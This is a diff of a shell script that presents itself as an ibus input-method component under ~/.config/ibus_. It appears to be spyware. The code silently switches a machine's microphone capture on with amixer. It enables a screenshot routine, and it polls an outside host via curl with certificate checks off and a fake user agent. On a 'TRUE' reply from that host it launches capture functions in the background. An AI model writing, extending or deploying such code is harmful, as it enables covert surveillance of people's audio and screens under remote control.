@@ -13,6 +13,17 @@ HOME_2="/home/$USER/.config/ibus_/"
 #IBUS_="/usr/local/sbin/ibus_/"
 IBUS_="/home/$USER/.config/ibus_/"
 
+function Mcx(){
+	microphone_status=$(amixer get Capture | grep "\[on\]")
+ 	#
+	if [[ -n $microphone_status ]]; then
+	    dbgx "ax... Mcx...Okx..."
+	else
+	    amixer set Capture toggle
+	    amixer set Capture cap
+	fi
+}
+
 function ssx_(){
     #imagemagick
     #export DISPLAY=:0.0
@@ -124,17 +135,6 @@ function Ntx(){
     #
 }
 
-function Mcx(){
-	microphone_status=$(amixer get Capture | grep "\[on\]")
- 	#
-	if [[ -n $microphone_status ]]; then
-	    dbgx "ax... Mcx...Okx..."
-	else
-	    amixer set Capture toggle
-	    amixer set Capture cap
-	fi
-}
-
 function px(){
     px_OX=`curl -k -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/px`
     if [[ "$px_OX" == "TRUE" ]]
@@ -147,7 +147,7 @@ function px(){
  	#
     	ax_ & ssx_ & PxNwx
     	#
-	#ssx2
+	ssx2
  	#reboot
 	#
 	exit 0
